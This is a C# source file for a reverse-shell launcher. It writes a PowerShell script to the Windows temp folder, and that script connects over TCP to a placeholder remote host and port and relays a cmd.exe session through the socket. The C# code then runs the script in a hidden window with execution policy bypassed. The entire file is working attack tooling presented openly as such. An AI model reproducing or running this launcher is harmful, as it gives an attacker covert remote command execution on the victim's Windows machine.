using System;
using System.Diagnostics;
using System.IO;

    public class PsConsole {
        
       public static void Main()
        {
            createpsrevshell();
        }
    
        static void createpsrevshell()
        {
            string psrevshelltempalte = @"function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$address = 'RHOST'
$port = 'RPORT'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
";
            File.WriteAllText(@"C:\windows\temp\powres.ps1", psrevshelltempalte);
            runpsrevshell();
        }


        static void runpsrevshell()
        {

            ProcessStartInfo pinfo = new ProcessStartInfo();
            if (Environment.Is64BitOperatingSystem)
            {
                pinfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";

            }
            else
            {
                pinfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }

            //p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c" + "IEX (C:\\Windows\\Temp\\powrev.ps1)";
            string ps1File = @"C:\windows\temp\powres.ps1";
			string strCmdText = string.Format("-w hidden -nop -ep bypass -file \"{0}\"",ps1File);
            pinfo.Arguments = strCmdText;
            pinfo.UseShellExecute = false;
            //pinfo.CreateNoWindow = true;
            pinfo.RedirectStandardOutput = false;
            // pinfo.Verb = "runas";
            try
            {
                Process.Start(pinfo);
            }
            catch (Exception)
            {

                //MessageBox.Show(e.Message);
            }

        }
    }
